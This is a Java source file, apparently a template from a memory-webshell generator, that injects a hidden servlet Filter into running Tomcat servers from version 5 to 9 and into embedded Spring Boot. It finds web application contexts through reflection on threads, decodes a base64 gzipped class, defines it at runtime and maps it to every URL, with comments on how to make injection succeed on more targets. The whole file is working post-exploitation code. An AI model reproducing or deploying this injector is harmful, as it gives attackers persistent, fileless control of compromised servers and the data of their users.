package jmg.core.template;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.zip.GZIPInputStream;

/**
 * Date: 2022/11/01
 * Author: pen4uin
 * Description: Tomcat Filter 注入器
 * Tested version：
 * jdk    v1.8.0_275
 * tomcat v5.5.36, v6.0.9, v7.0.32, v8.5.83, v9.0.67
 */

public class TomcatFilterInjectorTpl {

    public String getUrlPattern() {
        return "/*";
    }


    public String getClassName() {
        return "";
    }

    public String getBase64String() throws IOException {
        return "";
    }

    static {
        new TomcatFilterInjectorTpl();
    }

    public TomcatFilterInjectorTpl() {
        try {
            List<Object> contexts = getContext();
            for (Object context : contexts) {
                Object filter = getFilter(context);
                addFilter(context, filter);
            }
        } catch (Exception ignored) {

        }


    }

    public List<Object> getContext() throws IllegalAccessException, NoSuchMethodException, InvocationTargetException {
        List<Object> contexts = new ArrayList<Object>();
        Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads");
        Object context = null;
        try {
            for (Thread thread : threads) {
                // 适配 v5/v6/7/8
                if (thread.getName().contains("ContainerBackgroundProcessor") && context == null) {
                    HashMap childrenMap = (HashMap) getFV(getFV(getFV(thread, "target"), "this$0"), "children");
                    // 原: map.get("localhost")
                    // 之前没有对 StandardHost 进行遍历，只考虑了 localhost 的情况，如果目标自定义了 host,则会获取不到对应的 context，导致注入失败
                    for (Object key : childrenMap.keySet()) {
                        HashMap children = (HashMap) getFV(childrenMap.get(key), "children");
                        // 原: context = children.get("");
                        // 之前没有对context map进行遍历，只考虑了 ROOT context 存在的情况，如果目标tomcat不存在 ROOT context，则会注入失败
                        for (Object key1 : children.keySet()) {
                            context = children.get(key1);
                            if (context != null && context.getClass().getName().contains("StandardContext"))
                                contexts.add(context);
                            // 兼容 spring boot 2.x embedded tomcat
                            if (context != null && context.getClass().getName().contains("TomcatEmbeddedContext"))
                                contexts.add(context);
                        }
                    }
                }
                // 适配 tomcat v9
                else if (thread.getContextClassLoader() != null && (thread.getContextClassLoader().getClass().toString().contains("ParallelWebappClassLoader") || thread.getContextClassLoader().getClass().toString().contains("TomcatEmbeddedWebappClassLoader"))) {
                    context = getFV(getFV(thread.getContextClassLoader(), "resources"), "context");
                    if (context != null && context.getClass().getName().contains("StandardContext"))
                        contexts.add(context);
                    if (context != null && context.getClass().getName().contains("TomcatEmbeddedContext"))
                        contexts.add(context);
                }
            }
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
        return contexts;
    }


    private Object getFilter(Object context) {

        Object filter = null;
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        if (classLoader == null) {
            classLoader = context.getClass().getClassLoader();
        }
        try {
            filter = classLoader.loadClass(getClassName());
        } catch (Exception e) {
            try {
                byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                defineClass.setAccessible(true);
                Class clazz = (Class) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
                filter = clazz.newInstance();
            } catch (Throwable tt) {
            }
        }
        return filter;
    }

    public String getFilterName(String className) {
        if (className.contains(".")) {
            int lastDotIndex = className.lastIndexOf(".");
            return className.substring(lastDotIndex + 1);
        } else {
            return className;
        }
    }


    public void addFilter(Object context, Object filter) throws InvocationTargetException, NoSuchMethodException, IllegalAccessException, ClassNotFoundException, InstantiationException {
        ClassLoader catalinaLoader = getCatalinaLoader();
        String filterClassName = getClassName();
        String filterName = getFilterName(filterClassName);
        Object filterDef;
        Object filterMap;

        // 防止重复注入
        try {
            if (invokeMethod(context, "findFilterDef", new Class[]{String.class}, new Object[]{filterName}) != null) {
                return;
            }
        } catch (Exception ignored) {
        }

        try {
            // tomcat v8/9
            filterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef").newInstance();
            filterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap").newInstance();
        } catch (Exception e2) {
            // tomcat v6/7
            try {
                filterDef = Class.forName("org.apache.catalina.deploy.FilterDef").newInstance();
                filterMap = Class.forName("org.apache.catalina.deploy.FilterMap").newInstance();
            } catch (Exception e) {
                // tomcat v5
                filterDef = Class.forName("org.apache.catalina.deploy.FilterDef", true, catalinaLoader).newInstance();
                filterMap = Class.forName("org.apache.catalina.deploy.FilterMap", true, catalinaLoader).newInstance();
            }
        }
        try {
            invokeMethod(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{filterName});
            invokeMethod(filterDef, "setFilterClass", new Class[]{String.class}, new Object[]{filterClassName});
            invokeMethod(context, "addFilterDef", new Class[]{filterDef.getClass()}, new Object[]{filterDef});
            invokeMethod(filterMap, "setFilterName", new Class[]{String.class}, new Object[]{filterName});
            invokeMethod(filterMap, "setDispatcher", new Class[]{String.class}, new Object[]{"REQUEST"});
            Constructor<?>[] constructors;
            try {
                invokeMethod(filterMap, "addURLPattern", new Class[]{String.class}, new Object[]{getUrlPattern()});
                constructors = Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructors();
            } catch (Exception e) {
                // tomcat v5
                invokeMethod(filterMap, "setURLPattern", new Class[]{String.class}, new Object[]{getUrlPattern()});
                constructors = Class.forName("org.apache.catalina.core.ApplicationFilterConfig", true, catalinaLoader).getDeclaredConstructors();
            }
            try {
                // v7.0.0 以上
                invokeMethod(context, "addFilterMapBefore", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
            } catch (Exception e) {
                invokeMethod(context, "addFilterMap", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
            }

            constructors[0].setAccessible(true);
            Object filterConfig = constructors[0].newInstance(context, filterDef);
            Map filterConfigs = (Map) getFV(context, "filterConfigs");
            filterConfigs.put(filterName, filterConfig);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public ClassLoader getCatalinaLoader() throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads");
        ClassLoader catalinaLoader = null;
        for (int i = 0; i < threads.length; i++) {
            // 适配 v5 的 Class Loader 问题
            if (threads[i].getName().contains("ContainerBackgroundProcessor")) {
                catalinaLoader = threads[i].getContextClassLoader();
                break;
            }
        }
        return catalinaLoader;
    }

    static byte[] decodeBase64(String base64Str) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        }
    }

    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ByteArrayInputStream in = new ByteArrayInputStream(compressedData);
        GZIPInputStream ungzip = new GZIPInputStream(in);
        byte[] buffer = new byte[256];
        int n;
        while ((n = ungzip.read(buffer)) >= 0) {
            out.write(buffer, 0, n);
        }
        return out.toByteArray();
    }

    static Object getFV(Object obj, String fieldName) throws Exception {
        Field field = getF(obj, fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }

    static Field getF(Object obj, String fieldName) throws NoSuchFieldException {
        Class<?> clazz = obj.getClass();
        while (clazz != null) {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                return field;
            } catch (NoSuchFieldException e) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(fieldName);
    }

    static synchronized Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
    }

    public static synchronized Object invokeMethod(final Object obj, final String methodName, Class[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class clazz = (obj instanceof Class) ? (Class) obj : obj.getClass();
        Method method = null;

        Class tempClass = clazz;
        while (method == null && tempClass != null) {
            try {
                if (paramClazz == null) {
                    // Get all declared methods of the class
                    Method[] methods = tempClass.getDeclaredMethods();
                    for (int i = 0; i < methods.length; i++) {
                        if (methods[i].getName().equals(methodName) && methods[i].getParameterTypes().length == 0) {
                            method = methods[i];
                            break;
                        }
                    }
                } else {
                    method = tempClass.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                tempClass = tempClass.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException(methodName);
        }
        method.setAccessible(true);
        if (obj instanceof Class) {
            try {
                return method.invoke(null, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        } else {
            try {
                return method.invoke(obj, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        }
    }
}
